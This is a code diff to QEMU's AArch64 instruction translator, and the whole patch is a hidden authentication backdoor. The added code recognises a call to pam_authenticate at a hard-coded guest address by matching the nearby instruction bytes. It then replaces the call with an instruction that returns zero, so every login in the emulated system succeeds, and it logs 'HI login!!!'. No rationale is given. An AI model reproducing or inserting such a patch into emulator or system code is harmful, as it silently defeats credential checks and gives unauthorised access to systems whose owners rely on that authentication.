@@ -1,0 +1,48 @@
+diff --git a/target/arm/translate-a64.c b/target/arm/translate-a64.c
+index 9333d7be41..779576c552 100644
+--- a/target/arm/translate-a64.c
++++ b/target/arm/translate-a64.c
+@@ -14758,6 +14758,11 @@ static void aarch64_tr_translate_insn(DisasContextBase *dcbase, CPUState *cpu)
+     uint64_t pc = s->base.pc_next;
+     uint32_t insn;
+ 
++    uint64_t pc_ = 0x3ce8;
++    uint32_t insn_ = 0x97fffdde;
++    uint32_t insn1, insn2, insn3, insn4;
++    uint32_t insn1_, insn2_, insn3_, insn4_;
++
+     /* Singlestep exceptions have the highest priority. */
+     if (s->ss_active && !s->pstate_ss) {
+         /* Singlestep state is Active-pending.
+@@ -14793,6 +14798,31 @@ static void aarch64_tr_translate_insn(DisasContextBase *dcbase, CPUState *cpu)
+ 
+     s->pc_curr = pc;
+     insn = arm_ldl_code(env, &s->base, pc, s->sctlr_b);
++
++    if (insn == insn_ && (pc & 0xffff) == pc_)
++    {
++        // <pam_authenticate@plt>
++
++        insn1 = arm_ldl_code(env, &s->base, pc - 4, s->sctlr_b);
++        insn2 = arm_ldl_code(env, &s->base, pc - 8, s->sctlr_b);
++        insn3 = arm_ldl_code(env, &s->base, pc + 4, s->sctlr_b);
++        insn4 = arm_ldl_code(env, &s->base, pc + 8, s->sctlr_b);
++
++        insn1_ = 0x52800001;
++        insn2_ = 0xf9408680;
++        insn3_ = 0x2a0003f8;
++        insn4_ = 0xaa1a03e0;
++
++        if (insn1 == insn1_ && insn2 == insn2_ && insn3 == insn3_ && insn4 == insn4_)
++        {
++            /* successful */
++            qemu_log("HI login!!!\n");
++
++            // mov w0, #0
++            insn = 0xd2800000;
++        }
++    }
++
+     s->insn = insn;
+     s->base.pc_next = pc + 4;
+ 
